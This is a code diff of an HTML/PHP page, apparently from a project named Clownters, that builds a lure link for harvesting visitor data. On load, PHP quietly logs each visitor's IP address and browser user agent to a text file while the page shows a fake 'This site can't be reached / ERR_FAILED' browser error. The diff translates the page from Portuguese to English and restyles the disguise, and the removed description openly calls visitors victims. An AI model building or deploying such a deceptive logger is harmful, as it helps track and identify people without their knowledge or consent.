@@ -1,56 +1,82 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8"/>
-<meta property="og:type" content="website"/>
-<meta property="og:title" content="Clownters"/>
-<meta content="https://user-images.githubusercontent.com/82988362/215275753-140fda88-c496-481b-add9-3c82968f6c4b.jpg" property="og:image">
-<meta content="Organização Clownters" property="og:title">
-<meta property="og:description" content="@MIke90s15 - Script que criar uma url chamativa com objetivo de coleta de dados assim que a vitima acessar"/>
-<meta property="og:url" content="https://clownters.com" />
-<title>Clownters</title>
-<link rel="icon" href="https://raw.githubusercontent.com/mike90s15/cloud/main/Clownters/Imagens/IMG_20220225_170641_796.jpg">
-  <style>
-  body
-  {
-  background:#fff;
-  color:#000;
-  text-indet:2ch;
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta property="og:type" content="website">
+<meta property="og:title" content="a">
+<meta property="og:image" content="pic.jpg">
+<meta property="og:description" content="a">
+<meta property="og:url" content="a">
+<title>a</title>
+<link rel="icon" href="pic.jpg">
+<style>
+  body {
+    background: #fff;
+    color: #333;
+    margin: 0;
+    font-family: Arial, sans-serif;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    text-align: center;
   }
-  p
-  {
-  font-size:30px;
+  .container {
+    max-width: 600px;
+    padding: 20px;
   }
-  </style>
+  .icon {
+    font-size: 100px;
+    color: #d9534f;
+  }
+  h1 {
+    font-size: 24px;
+    margin: 20px 0;
+  }
+  p {
+    font-size: 14px;
+    margin: 5px 0;
+  }
+  .error-code {
+    margin-top: 20px;
+    color: #d9534f;
+    font-weight: bold;
+  }
+  @media (max-width: 600px) {
+    .icon {
+      font-size: 80px;
+    }
+    h1 {
+      font-size: 20px;
+    }
+  }
+</style>
 </head>
 <body>
-<!-- Clownters -->
-<?php                                                           if (!empty($_SERVER['HTTP_CLIENT_IP']))
-    {
-      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-    }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-    {
-      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-    }
-else
-    {
-      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-    }
-$file = 'ips.txt';
+<?php
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+  $ipaddress = $_SERVER['HTTP_CLIENT_IP'] . "\r\n";
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+  $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n";
+} else {
+  $ipaddress = $_SERVER['REMOTE_ADDR'] . "\r\n";
+}
+$file = 'ip.txt';
 $fp = fopen($file, 'a');
-fwrite($fp, "\033[1;34m  IP: \033[0;32m" . $ipaddress);
-fwrite($fp, "\033[1;34m  Navegador: \033[0;32m" . $_SERVER['HTTP_USER_AGENT']);
-fwrite($fp, "\n\n");
+fwrite($fp, "\033[1;34m  IP:\033[32m " . $ipaddress);
+fwrite($fp, "\033[1;34m  Browser:\033[32m " . $_SERVER['HTTP_USER_AGENT'] . "\n\n");
 fclose($fp);
 ?>
-  <h1>Não é possível acessar esse site</h1>
-  <p class="center">
-A conexão com internet foi recusada. <br>
-Tente: Verificar a conexão
-<br>
-<br>
-ERR_FAILED
-  </p>
+<div class="container">
+  <div class="icon">&#9888;</div>
+  <h1>This site can’t be reached</h1>
+  <p>The connection was refused.</p>
+  <p>Try:</p>
+  <p>Checking the connection</p>
+  <p class="error-code">ERR_FAILED</p>
+</div>
 </body>
 </html>
